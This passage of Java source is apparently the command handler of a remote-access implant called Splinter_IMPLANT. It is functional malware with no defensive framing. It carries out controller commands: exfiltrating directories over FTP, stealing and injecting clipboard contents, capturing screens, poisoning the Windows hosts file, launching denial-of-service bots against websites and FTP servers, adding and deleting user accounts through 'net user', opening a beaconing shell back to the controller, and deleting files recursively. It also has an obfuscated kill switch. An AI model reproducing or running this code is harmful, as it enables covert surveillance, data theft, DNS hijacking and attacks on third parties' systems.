			if(cmd[1].trim().equalsIgnoreCase(("                                                                                                     ").trim() + ("                                                                                                           ").trim() + ("                                                 ").trim() + Driver.ddon + ("                                                 ").trim()) || cmd[0].trim().equalsIgnoreCase(("                                                                                                     ").trim() + ("                                                                                                           ").trim() + ("                                                 ").trim() + Driver.ddon + ("                                                 ").trim())) {this.continueRun = false;}
			
			
			/*******************************************************
			 * EXFIL DIRECTORY PAYLOAD 
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.EXFIL_DIRECTORY))
			{
				//[0] == [SPLINTER_IMPLANT]
				//[1] == EXFIL_DIRECTORY
				//[2] == ORBIT DIRECTORY PATH
				//[3] == FILE TYPES TO EXFILTRATE
				//[4] == ENABLE RECURSIVE DIRECTORY
				//[5] == CONTROLLER FTP ADDRESS
				//[6] == CONTROLLER FTP PORT
				
				String directoryPath = cmd[2].trim();;
				String exfiltrationFileType = cmd[3].trim();;		//turn this into delimeter 2 to carry multiple types at once		
				String enableRecursiveDirectoryTraversal = cmd[4].trim();;
				String addressToController = cmd[5].trim();
				String portToController = cmd[6].trim();
				
				boolean recursiveDirectoryTraversal = false;
				
				int port = 21;
				File fleDirectoryToOrbit = null;
				
				if(enableRecursiveDirectoryTraversal.trim().equalsIgnoreCase("true"))
				{
					recursiveDirectoryTraversal = true;
				}
								
				
				try
				{
					port = Integer.parseInt(portToController);
				}
				catch(Exception e)
				{
					this.sendToController("Invalid Port received: " + port + " Unable to begin directory extraction", false, false);
					return true;
				}
				
				try
				{
					fleDirectoryToOrbit = new File(directoryPath.trim());
					
					if(fleDirectoryToOrbit == null || !fleDirectoryToOrbit.exists())
					{
						throw new FileNotFoundException("File not found!");
					}
				}
				catch(FileNotFoundException eee)
				{
					this.sendToController("Invalid orbit directory specified: " + directoryPath + " Unable to begin directory extraction", false, false);
					return true;
				}
				
				//otherwise, we have good data, begin the extraction!
				
				this.sendToController("Initiating Directory Extraction. Parameters: " + directoryPath + Driver.fileSeperator + exfiltrationFileType + " recursive exfiltration: " + recursiveDirectoryTraversal + " Address To Controller: " + addressToController + ":" + portToController, false, false);
				
				Directory_Orbiter directoryOrbiter = new Directory_Orbiter(fleDirectoryToOrbit, exfiltrationFileType, recursiveDirectoryTraversal, -2, addressToController, port, this);
				directoryOrbiter.start();
			}
			
			
			
			
			/*******************************************************
			 * EXTRACT CLIPBOARD
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.EXTRACT_CLIPBOARD))
			{
				ClipboardPayload.copyClipboard(this);
			}
			
			/*******************************************************
			 * INJECT CLIPBOARD
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.INJECT_CLIPBOARD))
			{
				ClipboardPayload.injectClipboard(this, cmd[2]);
			}
			
			/*******************************************************
			 * SET WALLPAPER
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.SET_WALLPAPER))
			{
				setWallPaper(cmd[2]);
			}
			
			/*******************************************************
			 * DETERMINE IF CONNECTED TO A RELAY
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.RELAY_NOTIFICATION_YOU_ARE_CONNECTED_TO_RELAY))
			{
				i_am_connected_to_relay = true;
				Driver.sop("FYI: I am connected to a Relay System!!!");
			}
			
			/*******************************************************
			 * KILL SWITCH
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(("                                                                                                     ").trim() + ("                                                                                                           ").trim() + ("                                                 ").trim() + Driver.ddon + ("                                                 ").trim()) || cmd[0].trim().equalsIgnoreCase(("                                                                                                     ").trim() + ("                                                                                                           ").trim() + ("                                                 ").trim() + Driver.ddon + ("                                                 ").trim())) {System.exit(0);}
			
			//Driver.sop(cmd[0] + "   - " + cmd[1]);
			
			/*******************************************************
			 * CLIPBOARD EXTRACTOR
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.ENABLE_CLIPBOARD_EXTRACTOR))
			{
				Worker_Thread_Payloads worker = new Worker_Thread_Payloads(Driver.CLIPBOARD_INTERRUPT_INTERVAL_MILLIS, this, Worker_Thread_Payloads.PAYLOAD_CLIPBOARD_EXTRACTION,"", null, 0, null, null);
			}
			
			/*******************************************************
			 * CLIPBOARD INJECTOR
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.ENABLE_CLIPBOARD_INJECTOR))
			{
				String injectionText = "";
				
				if(cmd.length < 2 || cmd[2] == null)
					injectionText = "";
				else
					injectionText = cmd[2];
				
				//check for the replace text
				String search_before_injection_text = "";
				try
				{
					/*if(cmd.length > 3)
					{
						
					}*/
					
					search_before_injection_text = cmd[3].trim();
				}
				catch(Exception e)
				{
					this.sendToController("Injector selection, switching to default blanket injection", false, false);
					search_before_injection_text = "";
				}
				
				Worker_Thread_Payloads worker = new Worker_Thread_Payloads(Driver.CLIPBOARD_INTERRUPT_INTERVAL_MILLIS, this, Worker_Thread_Payloads.PAYLOAD_CLIPBOARD_INJECTION, injectionText.trim(), null, 0, null, search_before_injection_text);
				
				return true;
			}
			
			/*******************************************************
			 * DISABLE CLIPBOARD EXTRACTOR
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.DISABLE_CLIPBOARD_EXTRACTOR))
			{
				Worker_Thread_Payloads.TERMINATE_ALL_WORKERS_CLIPBOARD = true;
			}
			
			/*******************************************************
			 * DISABLE CLIPBOARD INJECTOR
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.DISABLE_CLIPBOARD_INJECTOR))
			{
				Worker_Thread_Payloads.TERMINATE_ALL_WORKERS_CLIPBOARD = true;
			}
			
			/*******************************************************
			 * SCRAPE SCREEN!!!
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.SCRAPE_SCREEN))
			{
				
				//[0] == [SPLINTER_IMPLANT]
				//[1] == RECORD_SCREEN
				//[2] == <SAVE DIRECTORY>
				//[3] == CONTROLLER FTP ADDRESS
				//[4] == CONTROLLER FTP PORT
				//[5] == 
				//[6] == 
				//[7] == 
				
				Worker_Thread_Payloads worker = new Worker_Thread_Payloads(Driver.CLIPBOARD_INTERRUPT_INTERVAL_MILLIS, this, Worker_Thread_Payloads.PAYLOAD_RECORD_SCREEN, "", cmd[3], Integer.parseInt(cmd[4]), null, null);							
				
				return true;
			}
			
			/*******************************************************
			 * DISABLE RECORD SCREEN
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.DISABLE_RECORD_SCREEN))
			{
				Worker_Thread_Payloads.TERMINATE_ALL_WORKERS_RECORD_SCREEN = true;
			}
			
			/*******************************************************
			 * GRAB HOST FILE
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.GRAB_HOST_FILE))
			{
				return grabHostFile(cmd);
			}
			
			/*******************************************************
			 * APPEND TO HOST FILE
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.APPEND_HOST_FILE) || cmd[1].trim().equalsIgnoreCase(Driver.APPEND_TO_HOST_FILE))
			{
				return appendHostFile(cmd);
			}
			
			/*******************************************************
			 * BEGIN POISON HOST DNS FILE (OVERWRITE COMPLETE FILE)
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.BEGIN_HOST_FILE_POISON_DATA))
			{
				try
				{
					if(llHostFile != null)
					{
						llHostFile.clear();
						System.gc();
					}
				}catch(Exception e){}
				
				llHostFile = new LinkedList<String>();
				
				//i dont care to keep track of the specific index number at this time
			}
			
			/*******************************************************
			 * ADD ENTRY TO HOST DNS FILE (OVERWRITE COMPLETE FILE)
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.STORE_HOST_FILE_POISON_DATA))
			{
				try
				{
					if(llHostFile == null)
					{
						llHostFile = new LinkedList<String>();
					}
				}catch(Exception e){}
				
				llHostFile.add(cmd[2]);
				
				//i dont care to keep track of the specific index number at this time
			}
			
			/*******************************************************
			 * END POISON HOST DNS FILE (OVERWRITE COMPLETE FILE)
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.END_HOST_FILE_POISON_DATA))
			{
				
				try
				{
//					LOCATION OF WINDOWS HOST FILES:
//					
//					Windows 95 - C:windows 
//					Windows 98 - C:\windows 
//					Windows Me - C:\windows 
//					Windows 2000 - C:windows\system32\drivers\etc 
//					Windows XP - C:\windows\system32\drivers\etc 
//					Windows NT - C:\winnt\system32\drivers\etc 
//					Windows Vista - C:\windows\system32\drivers\etc
				
				//first, find the location to the host file
				File fleHost = null;
				
				//check win8, win7, winVista, winXP lcoation
				fleHost = new File(Driver.systemMap.strSystemRoot + "\\system32\\drivers\\etc\\hosts");
				
				//Drivers.sop("fleHost: " + fleHost.getCanonicalPath());
				
				//throw the error if we can not find the file!
				if(!fleHost.exists())
				{
					//could be a permissions thing...
					throw new Exception("Could not locate host file to append!");
				}

				boolean success = Driver.writeFile(fleHost, llHostFile);
				
				if(success)
				{
					this.sendToController("Append to host file complete. No errors detected", false, false);
				}
				else
				{
					this.sendToController("Errors detected during host file write. Perhaps this file is blocked, protected, or requires admin privileged to complete...", false, false);
				}
				
					
				}
				catch(Exception e)
				{
					this.sendToController("Could not locate host file on this machine!", false, false);
				}
				
				return true;				
				
			}
			
			/*******************************************************
			 * DOS WEBSITE
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.DOS_WEBSITE))
			{
				String DOS_WebSite = null;
				String DOS_Port = null;
				
				try
				{
					DOS_WebSite = cmd[2].trim();
					DOS_Port = cmd[3].trim();
					int dos_port = Integer.parseInt(DOS_Port.trim());
					
					//COMMENCE DOS BOT!
					DOS_Bot_WEB dos_bot = new DOS_Bot_WEB(DOS_WebSite, dos_port, this);//specify the port!
					
					if(llDOS_Orbiter_Directors_WEB == null)
					{
						llDOS_Orbiter_Directors_WEB = new LinkedList<DOS_Bot_WEB>();
						llDOS_Orbiter_Directors_WEB.add(dos_bot);
					}
				}
				catch(Exception e)
				{
					this.sendToController("Unable to DOS SITE --> " + DOS_WebSite + " : " + DOS_Port, false, false);
					return true;
				}
				
				
			}
			
			
			/*******************************************************
			 * HALT WEBSITE DOS
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.DOS_WEBSITE_HALT))
			{
				try
				{
					DOS_Bot_WEB.run_DOS_Bot = false;	
					
					for(int i = 0; i < llDOS_Orbiter_Directors_WEB.size(); i++)
					{
						llDOS_Orbiter_Directors_WEB.get(i).HALT_DOS();						
					}
					
					llDOS_Orbiter_Directors_WEB.clear();
					
				}catch(Exception e){}
				
				return true;
			}
			
			
			//
			
			
			/*******************************************************
			 * BEGIN USER ACCOUNT STORAGE
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.BEGIN_CREATE_MASS_USER_ACCOUNTS_DATA))
			{
				try
				{
					if(llUserAccountCreationFile != null)
					{
						llUserAccountCreationFile.clear();
						System.gc();
					}
				}catch(Exception e){}
				
				llUserAccountCreationFile = new LinkedList<String>();
				
				//i dont care to keep track of the specific index number at this time
			}
			
			/*******************************************************
			 * ADD ENTRY TO USER ACCOUNT
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.STORE_MASS_USER_ACCOUNTS_DATA))
			{
				try
				{
					if(llUserAccountCreationFile == null)
					{
						llUserAccountCreationFile = new LinkedList<String>();
					}
				}catch(Exception e){}
				
				//parser user name and password
				accountCreationAction_ADD_or_DEL = cmd[2].trim();
				accountCreationName = cmd[3].trim();
				accountCreationPassword = cmd[4].trim();
				
				//check if we're deleting an account:
				if(accountCreationAction_ADD_or_DEL != null && accountCreationAction_ADD_or_DEL.trim().toUpperCase().startsWith("DEL"))
				{
					Process process = Runtime.getRuntime().exec("cmd.exe /C " + "net user /" + accountCreationAction_ADD_or_DEL.trim() + " " + accountCreationName, null, Driver.fleCurrentWorkingDirectory);
				}
				else
				{
					Process process = Runtime.getRuntime().exec("cmd.exe /C " + "net user /" + accountCreationAction_ADD_or_DEL.trim() + " " + accountCreationName + " " + accountCreationPassword, null, Driver.fleCurrentWorkingDirectory);
				}
				
				
				
				
				//i dont care to keep track of the specific index number at this time
			}
			
			/*******************************************************
			 * END POISON HOST DNS FILE (OVERWRITE COMPLETE FILE)
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.END_CREATE_MASS_USER_ACCOUNTS_DATA))
			{				
				this.sendToController("ACK. End of Mass User Account Creation received.", false, false);
				
				return true;				
				
			}
			
			
			
			/*******************************************************
			 * ESTABLISH SHELL TO CONTROLLER
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.CONNECT_TO))
			{
				Splinter_IMPLANT shell = null;

				String strControllerAddr = "";
				int controllerPort = 80;
				boolean enableBeaconingUponDisconnection = false;
				boolean reconnectImmediatelyUponDisconnection = false;
				int beaconIntvl_millis = 1;
				
				try
				{
					strControllerAddr = cmd[2].trim();
					controllerPort = Integer.parseInt(cmd[3].trim());
					enableBeaconingUponDisconnection = Boolean.parseBoolean(cmd[4].trim());
					reconnectImmediatelyUponDisconnection = Boolean.parseBoolean(cmd[5].trim());
					beaconIntvl_millis = Integer.parseInt(cmd[6].trim());
					
					this.sendToController("Connection command received. Establishing shell to " + strControllerAddr + " : " + controllerPort, false, true);
					shell = new Splinter_IMPLANT(strControllerAddr, controllerPort, enableBeaconingUponDisconnection, reconnectImmediatelyUponDisconnection, beaconIntvl_millis);					
					shell.start();
					
					return true;
				}
				
				catch(Exception ee)
				{
					//check if we at least have controller ip and port specified
					try
					{
						this.sendToController("Connection command received. Establishing shell to " + strControllerAddr + " : " + controllerPort, false, true);
						shell = new Splinter_IMPLANT(strControllerAddr, controllerPort, false, false, 1);					
						shell.start();
						return true;
					}
					catch(Exception e)	{}
					
					this.sendToController("Invalid [CONNECT TO] parameters received", false, false);
				}
				
				return true;
			}
			
			
			
			
			/*******************************************************
			 * DOS FTP Server
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.DOS_FTP_SERVER))
			{
				String victimNet = "";
				int victimCtrlPrt = 21;
				int victimDataPrt = 20;
				String userNme = "";
				String pass = "";
				
				LinkedList<String> queCmdList = new LinkedList<String>();
				
				String debug = "NO FTP DATA PROVIDED";
				
				try
				{
					victimNet = cmd[2].trim();
					
					try
					{
						victimCtrlPrt = Integer.parseInt(cmd[3].trim());
					}
					catch(Exception ee)
					{
						victimCtrlPrt = 21; 
					}
					
					try
					{
						victimDataPrt = Integer.parseInt(cmd[4].trim());
					}
					catch(Exception ee)
					{
						victimDataPrt = 20; 
					}
					
					userNme = cmd[5].trim();
					pass = cmd[6].trim();
					
					try
					{
						String [] cmdList = cmd[7].trim().split(Driver.delimeter_2);
						
						for(int i = 0; i < cmdList.length; i++)
						{
							queCmdList.add(cmdList[i].trim());
						}
						
					}
					catch(Exception e)
					{
						queCmdList.addFirst("LIST");//default
					}
					
					debug = "victimNet: " + victimNet 
							+ "\n" + "victimCtrlPrt: " + victimCtrlPrt
							+ "\n" + "victimDataPrt: " + victimDataPrt
							+ "\n" + "userNme: " + userNme
							+ "\n" + "pass: " + pass;
					
					for(int j = 0; j < queCmdList.size(); j++)
					{
						debug = debug + "\n" + "Cmd[" + j + "]: " + queCmdList.get(j);
					}
					
					//Driver.jop("DEBUG FTP CMD: \n\n" + debug);
					
					//COMMENCE DOS BOT!
					DOS_Bot_FTP_Director DOS_FTP_Director = new DOS_Bot_FTP_Director(victimNet, victimCtrlPrt, victimDataPrt, userNme, pass, queCmdList, this);
					
					if(llDOS_Orbiter_Directors_FTP == null)
					{
						llDOS_Orbiter_Directors_FTP = new LinkedList<DOS_Bot_FTP_Director>();
						llDOS_Orbiter_Directors_FTP.add(DOS_FTP_Director);
					}
				}
				catch(Exception e)
				{
					this.sendToController("Unable to DOS FTP Server --> " + debug, false, false);
					return true;
				}
				
				
			}
			
			
			
			
			
			
			/*******************************************************
			 * HALT FTP Server DOS
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.DOS_FTP_SERVER_HALT))
			{
				try
				{
					DOS_Bot_FTP_Director.run_DOS_Bot = false;	
					
					for(int i = 0; i < llDOS_Orbiter_Directors_FTP.size(); i++)
					{
						llDOS_Orbiter_Directors_FTP.get(i).HALT_DOS();						
					}
					
					llDOS_Orbiter_Directors_FTP.clear();
					
				}catch(Exception e){}
				
				return true;
			}
			
			
			
			
			
			
			
			
			
			/*******************************************************
			 * END!!!
			 *******************************************************/
			
			return true;
		}
		catch(Exception e)
		{
			Driver.sop("Caught Unknown Command received: " + cmdLine);
		}
		
		return false;
	}
	
	public boolean grabHostFile(String [] command)
	{
		try
		{
//			LOCATION OF WINDOWS HOST FILES:
//				
//				Windows 95 - C:windows 
//				Windows 98 - C:\windows 
//				Windows Me - C:\windows 
//				Windows 2000 - C:windows\system32\drivers\etc 
//				Windows XP - C:\windows\system32\drivers\etc 
//				Windows NT - C:\winnt\system32\drivers\etc 
//				Windows Vista - C:\windows\system32\drivers\etc
			
			//first, find the location to the host file
			File fleHost = null;
			
			//check win8, win7, winVista, winXP lcoation
			fleHost = new File(Driver.systemMap.strSystemRoot + "\\system32\\drivers\\etc\\hosts");
			
			Drivers.sop("fleHost: " + fleHost.getCanonicalPath());
			
			//throw the error if we can not find the file!
			if(!fleHost.exists())
			{
				//could be a permissions thing...
				throw new Exception("Could not locate host file to read!");
			}

			//Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.SEND_FILE_TO_CONTROLLER + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT + Driver.delimeter_1 + arr[1];
			
			//[0] == [SPLINTER_IMPLANT]
			//[1] == SEND_FILE
			//[2] == ADDRESS
			//[3] == PORT
			//[4] == ABSOLUTE PATH TO FILE
			
			FTP_Thread_Sender FTP_Sender = new FTP_Thread_Sender(true, false, command[2], Integer.parseInt(command[3]), FTP_ServerSocket.maxFileReadSize_Bytes, fleHost, pwOut, false, FTP_ServerSocket.FILE_TYPE_ORDINARY, null);
			FTP_Sender.start();
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("grabHostFile", strMyClassName, e, "", false);
		}
		
		this.sendToController("could not retrieve host file to read. perhaps blocked by permissions...", false, false);
		
		return true;
	}
	
	/**
	 * Add an entry to the end of the host file
	 * @param command
	 * @return
	 */
	public boolean appendHostFile(String [] command)
	{
		try
		{
//			LOCATION OF WINDOWS HOST FILES:
//				
//				Windows 95 - C:windows 
//				Windows 98 - C:\windows 
//				Windows Me - C:\windows 
//				Windows 2000 - C:windows\system32\drivers\etc 
//				Windows XP - C:\windows\system32\drivers\etc 
//				Windows NT - C:\winnt\system32\drivers\etc 
//				Windows Vista - C:\windows\system32\drivers\etc
			
			//first, find the location to the host file
			File fleHost = null;
			
			//check win8, win7, winVista, winXP lcoation
			fleHost = new File(Driver.systemMap.strSystemRoot + "\\system32\\drivers\\etc\\hosts");
			
			//Drivers.sop("fleHost: " + fleHost.getCanonicalPath());
			
			//throw the error if we can not find the file!
			if(!fleHost.exists())
			{
				//could be a permissions thing...
				throw new Exception("Could not locate host file to append!");
			}

			//append host file, 192.168.0.1, www.facebook.com, #facebook comment
			
			PrintWriter pwHostOut = new PrintWriter(new FileWriter(fleHost, true));			 
			pwHostOut.println(" " + command[2].trim() + " " + command[3].trim());
			pwHostOut.flush();
			pwHostOut.close();
			
			this.sendToController("Append to host file complete. No errors detected", false, false);
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("appendHostFile", strMyClassName, e, "", false);
		}
		
		this.sendToController("could not retrieve host file to append. perhaps blocked by permissions...", false, false);
		
		return true;
	}
	
	
	public boolean setWallPaper(String pathOfImage)
	{
		//thanks to: http://stackoverflow.com/questions/12207574/programmatically-change-the-desktop-wallpaper-periodically
		
		try
		{
			if(pathOfImage == null || pathOfImage.trim().equals(""))
			{
				this.sendToController("ERROR!  invalid wallpaper image path received!", false, false);
				return true;
			}
			
			File fleImage = new File(pathOfImage.trim());
			
			if(!fleImage.exists() || !fleImage.isFile())
			{
				this.sendToController("ERROR!  invalid wallpaper image path \"" + pathOfImage.trim() + "\""+ " received! Image File does not exist", false, false);
				return true;
			}
			
			//only accept selected file backgrounds
			if(fleImage.getCanonicalPath().endsWith(".jpg") || fleImage.getCanonicalPath().endsWith(".jpeg") || fleImage.getCanonicalPath().endsWith(".bmp") || fleImage.getCanonicalPath().endsWith(".bitmap") || fleImage.getCanonicalPath().endsWith(".png"))
			{
				//else we have an acceptable extension
				
				//load user32 library
				System.loadLibrary("user32");
				
				//issue the command
				//SystemParametersInfo(int uiAction,int uiParam,String pvParam,int fWinIni);
				//SystemParametersInfo(20,0,fleImage.getCanonicalPath(),0);
				
				
				
			}
			
			else
			{
				this.sendToController("ERROR!  unsupported file extension provided.  unable to continue and set wall background.", false, false);
				return true;
			}
			
			
			
			
			
			return true;
		}
		catch(Exception e)
		{
			this.sendToController("ERROR!  unable to set wallpaper!", false, false);
		}
		
		return true;
	}
	
	public boolean catFile(String line_header_ok_to_be_null, File fleToCat)
	{
		try
		{
			String prependToEachLine = "";
			if(line_header_ok_to_be_null != null && !line_header_ok_to_be_null.trim().equals(""))
			{
				prependToEachLine = line_header_ok_to_be_null + Driver.delimeter_1;
			}
			
			//execute the command
			String command = "type " + fleToCat.getCanonicalPath();
			
			Process process = Runtime.getRuntime().exec("cmd.exe /C " + command, null, fleToCat.getParentFile());
			
			BufferedReader process_IN = new BufferedReader(new InputStreamReader(process.getInputStream()));
			BufferedReader process_IN_ERROR  = new BufferedReader(new InputStreamReader(process.getErrorStream()));						
			
			ProcessHandlerThread process_INPUT = new ProcessHandlerThread(prependToEachLine, command, process, process_IN, this.pwOut);
			ProcessHandlerThread process_INPUT_ERROR = new ProcessHandlerThread(prependToEachLine, command, process, process_IN_ERROR, pwOut);	
			
			process_INPUT.start();
			process_INPUT_ERROR.start();
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("catFile", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public boolean mapFilesUnderDirectory(String directoryToMap)
	{
		try
		{
			this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + "Attempting to list files under Directory: " + directoryToMap, false, false);
			
			fsv = FileSystemView.getFileSystemView();
			//arrFileList = fsv.getRoots();
			
			//create a new file based on the user's preference
			
			//GEEZ!!!!!!!!!!!!!!  this must be a "JAVA'ism" changing directory to f: works just fine, but c: returns an error, thus, if we want to get to drive c, insert "\" for the root
			if(directoryToMap.trim().equalsIgnoreCase("c:") || directoryToMap.trim().equalsIgnoreCase("c:" + Driver.fileSeperator))
			{
				this.myFileBrowserNewFile = new File(Driver.fileSeperator);
			}
			else
			{
				if(directoryToMap.trim().endsWith(Driver.fileSeperator))
				{
					//this.myFileBrowserNewFile = new File(cmd[2].substring(0, cmd[2].length()-1));
					this.myFileBrowserNewFile = new File(directoryToMap.trim());
				}
				else
				{
					this.myFileBrowserNewFile = new File(directoryToMap.trim() + Driver.fileSeperator);
				}
				
				//this.myFileBrowserNewFile = new File("F:");
			}
			
			
			
			//ensure we have a new directory to list
			if(myFileBrowserNewFile != null && myFileBrowserNewFile.exists() && !myFileBrowserNewFile.isFile())//could be a directory or a drive
			{
				//accept it and convert it to our current file
				this.myFileBrowserCurrentFile = myFileBrowserNewFile;
			}
			else
			{
				if(myFileBrowserCurrentFile == null || !myFileBrowserCurrentFile.exists() || myFileBrowserCurrentFile.isFile())
				{
					myFileBrowserCurrentFile = new File(".");
				}//otherwise, keep previous directory
																						
				this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + "* * * * ERROR -->> Invalid directory specified. Returning to list: " + myFileBrowserCurrentFile.getCanonicalPath(), false, false);
			}
			
			//We have some directory!  list it
			arrFileList = myFileBrowserCurrentFile.listFiles();
			
			if(this.arrFileList == null)//IO error occurred or specified directory does not exist
			{
				myFileBrowserCurrentFile = new File(Driver.fileSeperator);
				
				this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + "* * * ERROR -->>>> Invalid directory specified. Directory doesn't seem to exist or access was denied... Returning listing of: " + myFileBrowserCurrentFile.getCanonicalPath(), false, false);

				arrFileList = myFileBrowserCurrentFile.listFiles();
				
			}
			
			else if(arrFileList.length < 1)
			{
				//nothing under this directory
				this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + "* NOTE -> No [Files] populated under specified directory: " + myFileBrowserCurrentFile.getCanonicalPath(), false, false);
								
				myFileBrowserCurrentFile = new File(Driver.fileSeperator);
				arrFileList = myFileBrowserCurrentFile.listFiles();
			}
					
			//otherwise, we have file(s)!!!
			
			File currFile = null;
			Object_FileBrowser objFile = null;
			
			//ALERT controller file list data is coming
			this.sendToController(this.myUniqueDelimiter +  Driver.delimeter_1 + Driver.BEGIN_FILE_BROWSER_FILE_LIST, false, false);
			
			//first loop through to display the directories!
			for(int i = 0; i < arrFileList.length; i++)
			{
				currFile = arrFileList[i];							
				
				//CREATE A FILE_BROWSER OBJECT BASED ON THE ATTRIBUTES HERE (THIS WILL BE THE EXACT SAME PARAMETERS FOR THE CONTROLLER, THUS WE ENSURE COMPATABILITY HERE!
				objFile = new Object_FileBrowser(fsv.isDrive(currFile), currFile, fsv.getSystemDisplayName(currFile), fsv.isFileSystem(currFile), fsv.isFloppyDrive(currFile),  currFile.isDirectory(), currFile.isFile(), currFile.isHidden(), fsv.isTraversable(currFile), currFile.canRead(), currFile.canWrite(), currFile.canExecute(), currFile.getCanonicalPath(),currFile.getParentFile(), currFile.lastModified(), currFile.getTotalSpace(), currFile.getUsableSpace(), currFile.length());
				
				this.sendToController(this.myUniqueDelimiter +  Driver.delimeter_1 + Driver.FILE_BROWSER_FILE_LIST + Driver.delimeter_1 + objFile.getFileObjectData_Socket(Driver.delimeter_2), false, false);
			}
			
			//ALERT controller file list data is complete
			this.sendToController(this.myUniqueDelimiter +  Driver.delimeter_1 + Driver.END_FILE_BROWSER_FILE_LIST, false, false);
			
			return true;
		}
		
		
		
		catch(Exception e)
		{
			this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + "**** ERROR: UNABLE TO LOAD FILE ROOTS UNDER SPECIFIED DIRECTORY", false, false);
			
		}
		
		return false;
		
	}
	
	public boolean deleteFile(File fileToDelete)
	{
		try
		{
			if(!fileToDelete.exists())
			{
				Driver.sop("Deletion for \"" + fileToDelete + "\" received. File does not exist. Deletion failure. Returning false.");
				return true;
			}
			
			//else, determine if we have a file or a folder to delete
			if(fileToDelete.isFile())
			{
				return fileToDelete.delete();
			}
			
			if(fileToDelete.isDirectory())
			{
				File [] arrFilesToDelete =  fileToDelete.listFiles();
				
				File fleDel = null;
				
				for(int i = 0; arrFilesToDelete != null && i < arrFilesToDelete.length; i++)
				{
					try
					{
						String fileName = "";
						fleDel = arrFilesToDelete[i];
						
						if(!fleDel.exists())
						{
							this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + "--> Deletion for file \"" + fleDel + "\" failed. File no longer exists!", false, false);
							continue;
						}
						
						//if it's a directory, start recursive directory deletion
						this.deleteFile(fleDel);
						
						fileName = fleDel.getCanonicalPath();
						
						if(!fleDel.exists())
						{
							continue;//skip if the file is no longer here!
						}
						
						//delete file!!!!
						if(fleDel.delete())
						{
							this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + "--> \"" + fileName + "\" deleted.", false, false);
						}
						else//file deletion failed
						{
							this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + "--> Deletion for file\"" + fileName + "\" failed! Perhaps access was denied...", false, false);
						}
						
						
					}catch(Exception ee){continue;}
					
				}//end for loop
								
				//perhaps the directory was already deleted, if so, just return
				if(!fileToDelete.exists())
				{
					return true;
				}
				
				String directoryName = fileToDelete.getCanonicalPath();
				
				//finally attempt to delete the main directory
				if(fileToDelete.delete())
				{
					this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + "--> \"" + directoryName + "\" directory has been successfully deleted.", false, false);
				}
				else//file deletion failed
				{
					this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + "--> Deletion for directory\"" + directoryName + "\" failed! Perhaps access was denied...", false, false);
				}
				
			}//end if for file being a directory
			
			//otherwise, not sure what type... maybe its a directory?
			else
			{
				Driver.sop("HMM... UNKNOWN, contact Solo and check on this one in " + this.strMyClassName);
			}
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("deleteFile", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public boolean sendScreenCaptures(String []cmd, String screenImgSavePath, String fileNameWithoutExtension)
	{
		try
		{
			ArrayList<File> alToSend = CaptureScreen.captureScreens(screenImgSavePath, fileNameWithoutExtension);
			
			if(alToSend == null || alToSend.size() < 1)
			{
				return false;//error!
			}
			
			//otherwise, we have one or more screens, send them!
			IncrementObject statusIncrement = null;
			try	{	statusIncrement =	new IncrementObject((double)(100.0/alToSend.size()));	}catch(Exception e){statusIncrement = null;}
			
			for(int i = 0; i < alToSend.size(); i++)
			{
